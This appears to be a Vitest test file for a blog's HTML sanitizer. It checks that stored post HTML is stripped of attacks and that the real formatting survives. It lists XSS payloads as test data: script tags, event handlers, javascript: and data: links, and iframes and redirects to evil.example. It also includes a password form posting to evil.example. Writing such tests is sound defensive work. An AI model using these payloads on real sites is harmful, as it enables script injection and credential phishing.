import { describe, it, expect } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { PostBody } from "@/components/blog/post-content";

/**
 * The article body is stored HTML rendered with dangerouslySetInnerHTML, on
 * our own domain, with no CSP. Whoever can publish (and the publish key sat in
 * this public repo for four months) could put a script or a fake «inicie
 * sesión» form in front of every hotel owner who reads the blog. CON-323 /
 * ES-1. The body is now sanitized against an allowlist at render.
 *
 * Pinned both ways: every attack is stripped, AND everything the blog really
 * publishes survives untouched — a sanitizer that eats the tables or the links
 * is a regression of its own.
 */

const render = (html: string) => renderToStaticMarkup(createElement(PostBody, { html }));

describe("PostBody strips what a post must never carry", () => {
  const attacks: Array<[string, string, RegExp]> = [
    ["a script tag", "<p>Hola</p><script>alert(1)</script>", /<script|alert\(1\)/i],
    ["an inline event handler", '<p onmouseover="alert(1)">Hola</p>', /onmouseover|alert/i],
    ["an image with onerror", '<img src="x" onerror="alert(1)">', /<img|onerror/i],
    ["a javascript: link", '<a href="javascript:alert(1)">clic</a>', /javascript:/i],
    ["an obfuscated javascript: link", '<a href="  JaVaScRiPt&#58;alert(1)">clic</a>', /javascript|alert/i],
    ["a data: link", '<a href="data:text/html,<script>alert(1)</script>">clic</a>', /data:|<script/i],
    ["an iframe", '<iframe src="https://evil.example"></iframe>', /<iframe|evil\.example/i],
    [
      "a credential form",
      '<form action="https://evil.example"><input name="password" type="password"><button>Entrar</button></form>',
      /<form|<input|<button|evil\.example/i,
    ],
    ["an svg with onload", '<svg onload="alert(1)"><circle r="1"/></svg>', /<svg|onload/i],
    ["a style block", "<style>body{display:none}</style><p>Hola</p>", /<style|display:none/i],
    ["an inline style", '<p style="position:fixed;inset:0">Hola</p>', /style=|position:fixed/i],
    ["a meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">', /<meta|evil\.example/i],
    ["a base tag", '<base href="https://evil.example/">', /<base|evil\.example/i],
    ["an object embed", '<object data="https://evil.example/x.swf"></object>', /<object|evil\.example/i],
    ["a protocol-relative link", '<a href="//evil.example/login">Inicie sesión</a>', /evil\.example/i],
  ];

  it.each(attacks)("removes %s", (_label, html, forbidden) => {
    expect(render(html)).not.toMatch(forbidden);
  });

  it("keeps the readable text of a disallowed wrapper", () => {
    expect(render('<div class="x"><p>Texto <span>visible</span></p></div>')).toBe(
      '<div class="prose-blog max-w-none"><p>Texto visible</p></div>'
    );
  });

  it("downgrades an h1 to h2 — the page title is the only h1", () => {
    expect(render("<h1>Otro título</h1>")).toContain("<h2>Otro título</h2>");
  });
});

describe("PostBody keeps the formatting the blog publishes", () => {
  // Every tag and attribute found in the 23 live posts and in every
  // _pending_posts JSON in this repo's history (docs/blog-hotel-playbook.md §5).
  const REAL_POST =
    "<h2>Por qué la respuesta rápida vende</h2>" +
    "<p>Un hotel que responde en <strong>menos de 1 minuto</strong> convierte <em>más</em>.</p>" +
    "<h3>Qué medir</h3>" +
    "<ul><li>Tiempo de respuesta</li><li>Reservas directas &amp; ocupación</li></ul>" +
    "<ol><li>Primero</li><li>Segundo</li></ol>" +
    "<blockquote><p>«El huésped escribe a las 11 p. m.»</p><footer>— <cite>Gerente, Hotel Ejemplo</cite></footer></blockquote>" +
    '<p>Vea <a href="/hoteles/reservas-directas">reservas directas</a> y la ' +
    '<a href="https://www.cotelco.org/informe">fuente</a>.</p>' +
    "<table><thead><tr><th>Canal</th><th>Comisión</th></tr></thead>" +
    "<tbody><tr><td>Booking</td><td>15–18 %</td></tr><tr><td>Directo</td><td>0 %</td></tr></tbody></table>";

  it("renders a real post unchanged (tables still get their scroll wrapper)", () => {
    const expected = REAL_POST.replace("<table>", '<div class="prose-table"><table>').replace(
      "</table>",
      "</table></div>"
    );
    expect(render(REAL_POST)).toBe(`<div class="prose-blog max-w-none">${expected}</div>`);
  });

  it("keeps in-page anchors, mailto and table spans", () => {
    const html =
      '<p><a href="#preguntas">Ir</a> <a href="mailto:hola@conagentes.com">Escríbanos</a></p>' +
      '<table><tbody><tr><th scope="row">Total</th><td colspan="2">3</td></tr></tbody></table>';
    const out = render(html);
    expect(out).toContain('<a href="#preguntas">Ir</a>');
    expect(out).toContain('<a href="mailto:hola@conagentes.com">Escríbanos</a>');
    expect(out).toContain('<th scope="row">Total</th>');
    expect(out).toContain('<td colspan="2">3</td>');
  });
});
